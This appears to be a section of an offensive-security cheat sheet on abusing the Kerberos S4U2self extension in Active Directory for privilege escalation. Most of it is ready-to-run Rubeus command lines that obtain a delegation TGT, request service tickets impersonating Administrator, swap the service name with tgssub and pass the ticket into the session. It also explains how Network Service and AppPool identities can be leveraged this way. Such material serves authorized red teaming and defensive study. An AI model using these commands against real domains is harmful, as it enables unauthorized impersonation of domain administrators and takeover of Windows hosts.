# Kerberos Service for User Extension

* **Service For User To Self** which allows a service to obtain a TGS on behalf of another user
* **Service For User To Proxy** which allows a service to obtain a TGS on behalf of another user on another service

## S4U2self - Privilege Escalation

1. Get a TGT 
    * Using Unconstrained Delegation
    * Using the current machine account: `Rubeus.exe tgtdeleg /nowrap`
2. Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.
    ```ps1
    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
    Rubeus.exe ptt /ticket:"base64ticket"

    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
    ```

The "Network Service" account and the AppPool identities can act as the computer account in terms of Active Directory, they are only restrained locally. Therefore it is possible to invoke S4U2self if you run as one of these and request a service ticket for any user (e.g. someone with local admin rights, like DA) to yourself.

```ps1
# The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.
Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
# The service name is not included in the TGS ciphered data and can be modified at will.
Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
```